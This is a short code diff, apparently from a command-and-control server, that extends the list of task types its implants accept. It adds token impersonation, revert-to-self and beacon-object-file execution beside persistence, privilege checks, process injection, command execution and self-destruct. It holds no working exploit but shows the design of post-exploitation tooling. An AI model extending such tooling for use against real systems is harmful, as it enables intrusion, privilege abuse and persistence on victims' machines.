@@ -11,8 +11,8 @@ const VALID_TASK_TYPES = [
   'system_info', 'execute_command', 'upload_result', 'sleep_update',
   'ps', 'ps_json', 'kill', 'screenshot', 'ls', 'ls_json', 'cd', 'pwd', 'mkdir', 
   'rm', 'cp', 'mv', 'cat', 'download', 'upload', 'netstat', 'netstat_json', 'portscan', 
-  'persist', 'unpersist', 'self_destruct', 'getprivs', 'getenv', 'powershell',
-  'download_url', 'upload_url', 'inject'
+  'persist', 'unpersist', 'self_destruct', 'getprivs', 'impersonate', 'revert_self', 
+  'bof_run', 'getenv', 'powershell', 'download_url', 'upload_url', 'inject'
 ];
 
 const wsManager = require('../utils/wsManager');
